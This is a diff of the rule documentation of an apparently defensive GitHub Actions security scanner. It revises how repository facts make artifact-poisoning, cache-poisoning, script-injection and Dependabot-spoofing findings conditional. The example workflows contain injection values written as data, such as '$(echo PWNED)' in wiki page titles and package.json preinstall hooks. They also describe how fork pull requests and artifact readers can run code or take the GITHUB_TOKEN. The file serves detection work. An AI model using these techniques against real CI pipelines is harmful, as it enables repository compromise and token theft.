+- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The finding is conditional when no file of facts and no --fact answers the facts
   - observed: 2026-11-05, runner 2.338.2: a GitHub App made a commit status and a check run for a commit of a pull request from a fork: runs of status, check_suite and check_run started on the default branch, and the message of the commit, with \$( ) in it, was in commit.commit.message of status and in check_suite.head_commit.message of check_suite
   - observed: 2026-11-06, runner 2.338.2: the same again: the SHA of the commit of the pull request was in sha and commit.sha of status, check_suite.head_sha and check_suite.head_commit.id of check_suite, and check_run.head_sha and check_run.check_suite.head_sha of check_run; check_suite.after and check_suite.before were null; the author name and the committer name of the commit, with \$( ) in each, were in the payloads of status and check_suite
   - cites:
@@ -15284,7 +15290,7 @@
   - cites:
     - <https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#workflow_call>
     - <https://github.com/advisories/GHSA-7x29-qqmq-v6qc>
-- precondition wiki-open: on gollum, an account with no role in the repository can edit the wiki only in a public repository whose settings let anyone with an account edit the wiki (the fact repo.wiki-open). The finding holds only when repo.wiki-open is true, and the rule assumes repo.wiki-open to be true unless a file of facts says otherwise
+- precondition wiki-open: on gollum, an account with no role in the repository can edit the wiki only in a public repository whose settings let anyone with an account edit the wiki (the fact repo.wiki-open). The finding holds only when repo.wiki-open is true, and the finding is conditional when no source answers repo.wiki-open
   - observed: 2026-09-25, runner 2.337.0: a wiki page titled with \$( ) and backticks, written into run as github.event.pages&#91;0].title, ran the commands; GitHub kept \$, (, ), backticks and ;
   - observed: 2026-10-30, runner 2.338.0: in a public repository whose settings let anyone with an account edit the wiki, an account with no role in the repository created a wiki page on the web interface of GitHub and edited the page; the creation and the edit each started a run of gollum, and each run had the repository's secret, and a step of each run created a ref with the token of the run, which the workflow asked for with contents: write
   - cites:
@@ -15454,7 +15460,7 @@
   - remedy: download to \${{ runner.temp }}/artifacts and read the files as data only, or run the pull request's code in the pull_request workflow and pass only data
   - severity: critical (found from the CVSS metrics below by the table)
   - fix kinds: runner-temp-path
-  - fact kinds: repo.environment-protected (provider: repo-setting, assumed value: false), repo.default-token-write (provider: repo-setting, assumed value: true), git.commit-contains (provider: github, assumed value: none), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.environment-protected (provider: repo-setting), repo.default-token-write (provider: repo-setting), git.commit-contains (provider: github), repo.pull-request-target-allowed (provider: repo-setting)
   - attackers: fork-pr-author
   - preconditions: attacker-run, download-event, no-approval, token-reads, into-workspace, callers-events
   - true positives:
@@ -15941,7 +15947,7 @@
   - remedy: download to \${{ runner.temp }}/artifacts, or say in a file of facts that the files are only read as data
   - severity: critical (found from the CVSS metrics below by the table)
   - fix kinds: runner-temp-path
-  - fact kinds: repo.environment-protected (provider: repo-setting, assumed value: false), repo.default-token-write (provider: repo-setting, assumed value: true), git.commit-contains (provider: github, assumed value: none), download.executed (provider: user-supplied, assumed value: true), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.environment-protected (provider: repo-setting), repo.default-token-write (provider: repo-setting), git.commit-contains (provider: github), download.executed (provider: user-supplied), repo.pull-request-target-allowed (provider: repo-setting)
   - attackers: fork-pr-author
   - preconditions: attacker-run, download-event, no-approval, token-reads, into-workspace, callers-events
   - true positives:
@@ -16006,10 +16012,9 @@
       #   dawidd6/action-download-artifact v3 the artifact named out, from the
       #   newest run of its own workflow into the workspace, and no step after the
       #   download is seen to run the files of the artifact.
-      # reason: the search takes the run of a pull request from a fork on any
-      #   event of the job; what a run of member has is not documented, and the
-      #   rule reports the job as on any other event (the fact download.executed,
-      #   assumed true).
+      # reason: the search takes the run of a pull request from a fork on any event
+      #   of the job; what a run of member has is not documented, and the rule
+      #   reports the job as on any other event (the fact download.executed true).
       # attack-value: the file build.sh in the artifact named out, from the fork's pull_request run of the workflow = "echo PWNED\n"
       # attack-run-behavior: the pull request from a fork changes the workflow to
       #   run on pull_request too, and the pull_request run uploads build.sh in
@@ -16087,8 +16092,8 @@
       # reason: the run of ci that starts this one may be a pull request's from a
       #   fork, whose author then decides the artifact's files; the job checks out
       #   nothing, so the build.sh that source reads can only come from the artifact
-      #   (download.executed, assumed true), and it runs in this workflow_run,
-      #   with the base repository's token, not in the pull request's run.
+      #   (download.executed true), and it runs in this workflow_run, with the base
+      #   repository's token, not in the pull request's run.
       # attack-value: the file build.sh in the artifact of the pull request's ci run = "echo PWNED\n"
       # attack-run-behavior: the fork's pull request changes ci so its run uploads
       #   build.sh; when that run completes, the download takes its artifact by
@@ -18086,15 +18091,16 @@
 - not-executed: a job that runs nothing it downloaded, such as one that only publishes it
   - finding kinds: artifact-poisoning.download
   - fact kinds:
-    - download.executed (provider: user-supplied, assumed value: true)
+    - download.executed (provider: user-supplied, answer that removes the finding: false)
   - example: not-executed.yml (workflow, false-positive)
     ```yaml
     # situation: the job runs on workflow_run, downloads the artifact of the run
     #   before it, and only counts the lines of what it downloaded.
     # reason: the job runs none of what it downloaded.
-    # cause: when no step is seen to run the download, the rule takes it as run
-    #   unless a file of facts writes download.executed false (it is assumed
-    #   true, the worst case).
+    # cause: unless a file of facts or --fact says that no step runs what the
+    #   download puts in the workspace (download.executed false), the rule reports
+    #   the finding, also when no step is seen to run it. When no file of facts
+    #   and no --fact answers download.executed, the finding is conditional.
     # attack-value: the file build.sh in the artifact of the pull request's ci run = "#!/bin/sh\necho PWNED\n"
     # attack-run-behavior: the download puts the artifact's files in the
     #   workspace, and the job only runs wc -l report.txt, which counts lines;
@@ -18144,16 +18150,17 @@
 - environment-protected: a job whose environment has required reviewers, who approve it before it runs
   - finding kinds: artifact-poisoning.executed, artifact-poisoning.download
   - fact kinds:
-    - repo.environment-protected (provider: repo-setting, assumed value: false)
+    - repo.environment-protected (provider: repo-setting, answer that removes the finding: true)
   - example: environment-protected.yml (workflow, false-positive)
     ```yaml
     # situation: the job runs on workflow_run in the environment production,
     #   downloads the artifact of the run before it and runs npm ci.
     # reason: the environment production has required reviewers, who approve the
     #   job before it runs.
-    # cause: the rule takes the environment as one that approves nothing unless
-    #   a file of facts says it has required reviewers
-    #   (repo.environment-protected is assumed false, the worst case).
+    # cause: unless a file of facts or --fact says that the environment has
+    #   required reviewers (repo.environment-protected true), the rule reports the
+    #   finding. When no source answers repo.environment-protected, the finding is
+    #   conditional.
     # attack-value: the file package.json in the artifact of the pull request's ci run = "{\"scripts\":{\"preinstall\":\"echo PWNED\"}}"
     # attack-run-behavior: the job waits until a required reviewer of production
     #   approves it; a reviewer who sees that the run before it is of a fork's
@@ -18177,16 +18184,17 @@
 - default-token-read: a job that writes no permissions, in a repository whose default token is read: the token reads no artifact of another run
   - finding kinds: artifact-poisoning.executed, artifact-poisoning.download
   - fact kinds:
-    - repo.default-token-write (provider: repo-setting, assumed value: true)
+    - repo.default-token-write (provider: repo-setting, answer that removes the finding: false)
   - example: default-token-read.yml (workflow, false-positive)
     ```yaml
     # situation: the job runs on workflow_run, writes no permissions, downloads
     #   the artifact of the run before it with github.token and runs npm ci.
     # reason: the repository's default token is read, which reads no artifact of
     #   another run.
-    # cause: the rule takes the default token as one that may write unless a
-    #   file of facts says it is read (repo.default-token-write is assumed true,
-    #   the worst case).
+    # cause: unless a file of facts or --fact says that the default token is read
+    #   (repo.default-token-write false), the rule treats the default token as a
+    #   token that may write and reports the finding. When no source answers
+    #   repo.default-token-write, the finding is conditional.
     # attack-value: the file package.json in the artifact of the pull request's ci run = "{\"scripts\":{\"preinstall\":\"echo PWNED\"}}"
     # attack-run-behavior: the job's github.token is the repository's default,
     #   read, which cannot read the artifacts of another run, so the download
@@ -18815,7 +18823,7 @@
 - pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
   - finding kinds: artifact-poisoning.executed, artifact-poisoning.download
   - fact kinds:
-    - repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
   - example: pull-request-target-blocked.yml (workflow, false-positive)
     ```yaml
     # situation: on pull_request_target, a job downloads the artifact of the ci
@@ -18831,9 +18839,10 @@
     #   run that a policy does not allow fails with an error; the documents do not
     #   say whether a job of such a run starts before the run fails, and the rule
     #   assumes that no job starts.
-    # cause: the rule assumes that a run on pull_request_target starts, unless a
-    #   file of facts or --fact says that the Actions policies block the runs
-    #   (repo.pull-request-target-allowed is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the Actions policies block
+    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
+    #   rule reports the finding. When no file of facts and no --fact answers
+    #   repo.pull-request-target-allowed, the finding is conditional.
     # attack-value: the file build.sh in the artifact of the ci run of the pull request = "echo PWNED\n"
     # attack-run-behavior: the pull request of the attacker triggers
     #   pull_request_target, and the run fails with an error, and no job of the
@@ -18949,12 +18958,12 @@
   - observed: 2026-11-05, runner 2.338.2: a job of a push run, with dawidd6/action-download-artifact v3.1.4 and no input workflow, run_id or allow_forks, took the artifact of the newest run of its workflow, a pull_request run of a pull request from a fork; v20, whose input allow_forks is false by default, skipped that run, whose head repository was the fork
   - cites:
     - <https://github.com/dawidd6/action-download-artifact/blob/09f2f74827fd3a8607589e5ad7f9398816f540fe/main.js>
-- precondition no-approval: no one approves the run: either the job runs on at least one event other than pull_request_target with the activity type labeled, and a run on the other event starts with no label added, or no person adds the label that starts the run, as the label is a label that a workflow of the repository of the job adds to the pull request of an attacker by running actions/labeler with a token other than the GITHUB_TOKEN; and the job has no environment that has required reviewers (repo.environment-protected, assumed false)
+- precondition no-approval: no one approves the run: either the job runs on at least one event other than pull_request_target with the activity type labeled, and a run on the other event starts with no label added, or no person adds the label that starts the run, as the label is a label that a workflow of the repository of the job adds to the pull request of an attacker by running actions/labeler with a token other than the GITHUB_TOKEN; and the job has no environment that has required reviewers (repo.environment-protected false)
   - observed: 2026-09-28, runner 2.337.0: a push after the label ran no labeled run, and ran pull_request_target on synchronize
-- precondition token-reads: the token may read the artifacts of another run: the scope actions, read-all or write-all for the GITHUB_TOKEN, or the repository's permissive default when no permissions are written (repo.default-token-write, assumed true); permissions written without actions set it to none
+- precondition token-reads: the token may read the artifacts of another run: the scope actions, read-all or write-all for the GITHUB_TOKEN, or the repository's permissive default when no permissions are written (repo.default-token-write true); permissions written without actions set it to none
   - cites:
     - <https://docs.github.com/en/actions/concepts/security/github_token>
-- precondition into-workspace: the files go into the workspace, where they replace the files a build reads (no path, a relative one, a literal \$RUNNER_TEMP, or a release with the zip-slip of 4.0.0 to 4.1.2), or a step after it names them to run; when none is seen to run, the finding holds if one does (download.executed, assumed true)
+- precondition into-workspace: the files go into the workspace, where they replace the files a build reads (no path, a relative one, a literal \$RUNNER_TEMP, or a release with the zip-slip of 4.0.0 to 4.1.2), or a step after it names them to run; when none is seen to run, the finding holds if one does (download.executed true)
   - observed: 2026-10-04, runner 2.337.0: actions/download-artifact@v4 with no path put the artifact's x.sh over the x.sh a step before had written in the workspace
   - cites:
     - <https://github.com/github/codeql/blob/f7617abe602d4763cd08c6a57b6a6bc347e7e325/actions/ql/src/Security/CWE-829/ArtifactPoisoningCritical.md>
@@ -19094,7 +19103,7 @@
   - remedy: set persist-credentials: false on the checkout, or upload only the files the artifact needs
   - severity: critical (found from the CVSS metrics below by the table)
   - fix kinds: persist-credentials-false
-  - fact kinds: repo.default-token-write (provider: repo-setting, assumed value: true), git.commit-contains (provider: github, assumed value: none)
+  - fact kinds: repo.default-token-write (provider: repo-setting), git.commit-contains (provider: github)
   - attackers: artifact-reader
   - preconditions: leaves-git-credential, artifact-taken, token-writes
   - incidents: artipacked-2024
@@ -19419,7 +19428,7 @@
   - remedy: set persist-credentials: false on the checkout, or upload only the files the artifact needs
   - severity: critical (found from the CVSS metrics below by the table)
   - fix kinds: persist-credentials-false
-  - fact kinds: git.commit-contains (provider: github, assumed value: none)
+  - fact kinds: git.commit-contains (provider: github)
   - attackers: artifact-reader
   - preconditions: leaves-git-credential, artifact-taken
   - true positives:
@@ -20133,7 +20142,7 @@
 - default-token-read: a job that writes no permissions, in a repository whose default token is read
   - finding kinds: artipacked.github-token
   - fact kinds:
-    - repo.default-token-write (provider: repo-setting, assumed value: true)
+    - repo.default-token-write (provider: repo-setting, answer that removes the finding: false)
   - example: default-token-read.yml (workflow, false-positive)
     ```yaml
     # situation: the job writes no permissions, checks out the repository and
@@ -20141,9 +20150,10 @@
     #   among them.
     # reason: the repository's default token is read, so the token in the
     #   artifact writes nothing.
-    # cause: the rule takes the default token as one that may write unless a
-    #   file of facts says it is read (repo.default-token-write is assumed true,
-    #   the worst case).
+    # cause: unless a file of facts or --fact says that the default token is read
+    #   (repo.default-token-write false), the rule treats the default token as a
+    #   token that may write and reports the finding. When no source answers
+    #   repo.default-token-write, the finding is conditional.
     # attack: a reader of the repository's artifacts (anyone, in a public
     #   repository) downloads the artifact through the API while the job still
     #   runs, and takes the token from the line
@@ -20219,7 +20229,7 @@
 - precondition artifact-taken: anyone signed in with read access to the repository downloads the artifacts of its runs, on a public repository anyone with an account; from actions/upload-artifact v4 an artifact is there as soon as it is uploaded, before the run ends
   - cites:
     - <https://docs.github.com/en/actions/how-tos/manage-workflow-runs/download-workflow-artifacts>
-- precondition token-writes: the GITHUB_TOKEN works until the job ends, and the artifact is there before (v4 on): the steps and the post steps after the upload leave the time, even when it is the last step; the token may write: a scope other than id-token written write, or no permissions written and the repository's default writes (repo.default-token-write, assumed true)
+- precondition token-writes: the GITHUB_TOKEN works until the job ends, and the artifact is there before (v4 on): the steps and the post steps after the upload leave the time, even when it is the last step; the token may write: a scope other than id-token written write, or no permissions written and the repository's default writes (repo.default-token-write true)
   - observed: 2026-09-30, runner 2.337.0: a token read from .git/config of an artifact downloaded while its job still ran read the private repository then, and was refused after the run
   - cites:
     - <https://docs.github.com/en/actions/concepts/security/github_token>
@@ -20356,7 +20366,7 @@
   - remedy: compare the author of the pull request, github.event.pull_request.user.login, which Dependabot's push does not change
   - severity: critical (found from the CVSS metrics below by the table)
   - fix kinds: author-context
-  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting)
   - attackers: fork-pr-author
   - preconditions: actor-compared, dependabot-push, callers-events
   - true positives:
@@ -21072,7 +21082,7 @@
 - pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
   - finding kinds: bot-conditions.dependabot
   - fact kinds:
-    - repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
   - example: pull-request-target-blocked.yml (workflow, false-positive)
     ```yaml
     # situation: on pull_request_target, the job runs only when the actor is
@@ -21087,9 +21097,10 @@
     #   run that a policy does not allow fails with an error; the documents do not
     #   say whether a job of such a run starts before the run fails, and the rule
     #   assumes that no job starts.
-    # cause: the rule assumes that a run on pull_request_target starts, unless a
-    #   file of facts or --fact says that the Actions policies block the runs
-    #   (repo.pull-request-target-allowed is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the Actions policies block
+    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
+    #   rule reports the finding. When no file of facts and no --fact answers
+    #   repo.pull-request-target-allowed, the finding is conditional.
     # attack: the attacker enables Dependabot in the fork of the attacker, opens
     #   a pull request to this repository from the branch of a pull request that
     #   Dependabot opened in the fork, then comments @dependabot recreate on the
@@ -21704,7 +21715,7 @@
   - remedy: make the cache-mode read or none, and save the cache from a workflow the attacker does not trigger, such as one on push
   - severity: high (found from the CVSS metrics below by the table)
   - fix kinds: cache-mode-no-write
-  - fact kinds: repo.environment-protected (provider: repo-setting, assumed value: false), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true), repo.fork-pr-app-checks (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.environment-protected (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks
   - preconditions: privileged-job, no-approval, cache-writes, flaw-in-job, restored-later, app-status-check, callers-events
   - incidents: tanstack-2026
@@ -22094,7 +22105,7 @@
   - consequence: the pull request's author puts their files in a cache that later runs of the repository restore and run, with no code of theirs run in the job
   - remedy: check out the base's code, save to the cache only what the job builds from it, or make the cache-mode read or none
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.environment-protected (provider: repo-setting, assumed value: false), git.commit-contains (provider: github, assumed value: none), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true), repo.fork-pr-app-checks (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.environment-protected (provider: repo-setting), git.commit-contains (provider: github), repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting)
   - attackers: fork-pr-author, commenter
   - preconditions: privileged-job, no-approval, cache-writes, pr-tree, no-guard, saves-tree, restored-later, app-status-check, callers-events
   - true positives:
@@ -22219,7 +22230,7 @@
   - consequence: the attacker chooses the key, and saves first under one that later runs of the repository look up
   - remedy: make the key of values the attacker does not write, or make the cache-mode read or none
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.environment-protected (provider: repo-setting, assumed value: false), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true), repo.fork-pr-app-checks (provider: repo-setting, assumed value: true), repo.merge-commit-app-checks (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.environment-protected (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting), repo.merge-commit-app-checks (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks, merged-commit-author
   - preconditions: privileged-job, no-approval, cache-writes, attacker-cache-input, restored-later, app-status-check, callers-events
   - true positives:
@@ -22340,7 +22351,7 @@
   - consequence: the attacker chooses the files saved, such as the credential a checkout leaves in .git, and anyone who can open a pull request reads the caches of the default branch
   - remedy: make the path of values the attacker does not write, or make the cache-mode read or none
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.environment-protected (provider: repo-setting, assumed value: false), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true), repo.fork-pr-app-checks (provider: repo-setting, assumed value: true), repo.merge-commit-app-checks (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.environment-protected (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting), repo.merge-commit-app-checks (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks, merged-commit-author
   - preconditions: privileged-job, no-approval, cache-writes, attacker-cache-input, app-status-check, callers-events
   - true positives:
@@ -24459,7 +24470,7 @@
 - pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
   - finding kinds: cache-poisoning.writable-job, cache-poisoning.saved-checkout, cache-poisoning.attacker-key, cache-poisoning.attacker-path
   - fact kinds:
-    - repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
   - example: pull-request-target-blocked.yml (workflow, false-positive)
     ```yaml
     # situation: on pull_request_target, a job with cache-mode: write checks out
@@ -24473,9 +24484,10 @@
     #   run that a policy does not allow fails with an error; the documents do not
     #   say whether a job of such a run starts before the run fails, and the rule
     #   assumes that no job starts.
-    # cause: the rule assumes that a run on pull_request_target starts, unless a
-    #   file of facts or --fact says that the Actions policies block the runs
-    #   (repo.pull-request-target-allowed is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the Actions policies block
+    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
+    #   rule reports the finding. When no file of facts and no --fact answers
+    #   repo.pull-request-target-allowed, the finding is conditional.
     # attack: a flaw of the job runs the code of the attacker, which saves an
     #   entry under the key of the release workflow.
     # attack-run-behavior: the pull request of the attacker triggers
@@ -24649,7 +24661,7 @@
 
 ### threat
 
-- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The rule assumes each fact to be true unless a file of facts says otherwise
+- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The finding is conditional when no file of facts and no --fact answers the facts
   - observed: 2026-11-05, runner 2.338.2: a GitHub App made a commit status and a check run for a commit of a pull request from a fork: runs of status, check_suite and check_run started on the default branch, and the message of the commit, with \$( ) in it, was in commit.commit.message of status and in check_suite.head_commit.message of check_suite
   - observed: 2026-11-06, runner 2.338.2: the same again: the SHA of the commit of the pull request was in sha and commit.sha of status, check_suite.head_sha and check_suite.head_commit.id of check_suite, and check_run.head_sha and check_run.check_suite.head_sha of check_run; check_suite.after and check_suite.before were null; the author name and the committer name of the commit, with \$( ) in each, were in the payloads of status and check_suite
   - cites:
@@ -24664,7 +24676,7 @@
   - observed: 2026-10-13, runner 2.337.0: a pull_request run saved its caches to refs/pull/&lt;n>/merge, with cache-mode: write too
   - cites:
     - <https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching>
-- precondition no-approval: no one approves the run: either the job runs on at least one event other than pull_request_target with the activity type labeled, and a run on the other event starts with no label added, or no person adds the label that starts the run, as the label is a label that a workflow of the repository of the job adds to the pull request of an attacker by running actions/labeler with a token other than the GITHUB_TOKEN; and the job has no environment that has required reviewers (repo.environment-protected, assumed false: an environment is made with no protection rules)
+- precondition no-approval: no one approves the run: either the job runs on at least one event other than pull_request_target with the activity type labeled, and a run on the other event starts with no label added, or no person adds the label that starts the run, as the label is a label that a workflow of the repository of the job adds to the pull request of an attacker by running actions/labeler with a token other than the GITHUB_TOKEN; and the job has no environment that has required reviewers (repo.environment-protected false: an environment is made with no protection rules)
   - observed: 2026-09-28, runner 2.337.0: a push after the label ran no labeled run, and ran pull_request_target on synchronize
 - precondition cache-writes: the job's cache-mode, or else the workflow's, is write or write-only: on those events GitHub lets a job save to the cache of the default branch's scope only then; a reusable workflow's, when the job that calls it writes none
   - observed: 2026-10-13, runner 2.337.0: on pull_request_target, issue_comment and workflow_run, a job with cache-mode write or write-only saved a cache to the default branch's scope, and one without it was denied
@@ -24952,7 +24964,7 @@
   - remedy: pass it through env and read the variable
   - severity: critical (found from the CVSS metrics below by the table)
   - fix kinds: env-var, env-var-review
-  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting, assumed value: true), repo.fork-pr-app-checks (provider: repo-setting, assumed value: true), repo.merge-commit-app-checks (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting), repo.merge-commit-app-checks (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, merged-commit-author, anyone-who-forks
   - preconditions: runner-writes, attacker-writes, attacker-event, callers-events, app-status-check
   - incidents: ultralytics-2024
@@ -27185,7 +27197,7 @@
   - consequence: the value becomes code
   - remedy: do not pass the variable to eval (eval "..."), to the code that a shell or an interpreter takes after -c (bash -c "...", python3 -c "..."), to the command name at the start of a command (\$VAR arg), to the input of a shell (| bash) or to arithmetic (\$(( ... )), &#91;&#91; ... -eq ... ]]); pass the variable only as an argument of a command that reads the argument as data, such as printf '%s\\n' "\$VAR". Keep the variable inside double quotes there: without the quotes the value stays data, but bash splits the value into words and expands \* and ?
   - severity: critical (found from the CVSS metrics below by the table)
-  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting, assumed value: true), repo.fork-pr-app-checks (provider: repo-setting, assumed value: true), repo.merge-commit-app-checks (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting), repo.merge-commit-app-checks (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, merged-commit-author, anyone-who-forks
   - preconditions: value-read-as-code, attacker-writes, attacker-event, callers-events, app-status-check
   - true positives:
@@ -27662,7 +27674,7 @@
   - consequence: the value becomes code
   - remedy: do not pass the variable to eval (eval "..."), to the code that a shell or an interpreter takes after -c (bash -c "...", python3 -c "..."), to the command name at the start of a command (\$VAR arg), to the input of a shell (| bash) or to arithmetic (\$(( ... )), &#91;&#91; ... -eq ... ]]); pass the variable only as an argument of a command that reads the argument as data, such as printf '%s\\n' "\$VAR". Keep the variable inside double quotes there: without the quotes the value stays data, but bash splits the value into words and expands \* and ?
   - severity: critical (found from the CVSS metrics below by the table)
-  - fact kinds: repo.wiki-open (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.wiki-open (provider: repo-setting)
   - attackers: wiki-editor
   - preconditions: value-read-as-code, attacker-event, callers-events, wiki-open
   - true positives:
@@ -27670,8 +27682,8 @@
       ```yaml
       # situation: on gollum, a step passes the title of the first wiki page
       #   changed in the environment variable PAGE_TITLE and runs eval with it.
-      # reason: anyone may edit the wiki when it is open to all (repo.wiki-open,
-      #   assumed true), and eval reads the expanded text as a command.
+      # reason: anyone may edit the wiki when it is open to all (repo.wiki-open
+      #   true), and eval reads the expanded text as a command.
       # attack-value: github.event.pages[0].title = "$(echo PWNED)"
       # attack-run-behavior: eval reads echo $(echo PWNED) as a command, runs the
       #   command substitution and prints PWNED.
@@ -27713,7 +27725,7 @@
   - remedy: pass it through env and read the variable
   - severity: critical (found from the CVSS metrics below by the table)
   - fix kinds: env-var, env-var-review
-  - fact kinds: repo.wiki-open (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.wiki-open (provider: repo-setting)
   - attackers: wiki-editor
   - preconditions: runner-writes, attacker-event, callers-events, wiki-open
   - true positives:
@@ -27721,10 +27733,10 @@
       ```yaml
       # situation: on gollum, a run step echoes the title of the first wiki page
       #   changed, written in by ${{ }}.
-      # reason: anyone may edit the wiki when it is open to all (repo.wiki-open,
-      #   assumed true), and ${{ }} puts the page's title into the script before
-      #   the shell parses it, so a double quote in it ends the echo's string and
-      #   what follows runs as commands.
+      # reason: anyone may edit the wiki when it is open to all (repo.wiki-open
+      #   true), and ${{ }} puts the page's title into the script before the shell
+      #   parses it, so a double quote in it ends the echo's string and what follows
+      #   runs as commands.
       # attack-value: github.event.pages[0].title = "$(echo PWNED)"
       # attack-run-behavior: the script becomes echo "$(echo PWNED)", and bash
       #   runs the command substitution inside the double quotes, so echo prints
@@ -30088,14 +30100,15 @@
 - wiki-closed: gollum in a repository whose wiki is off or that only collaborators may edit
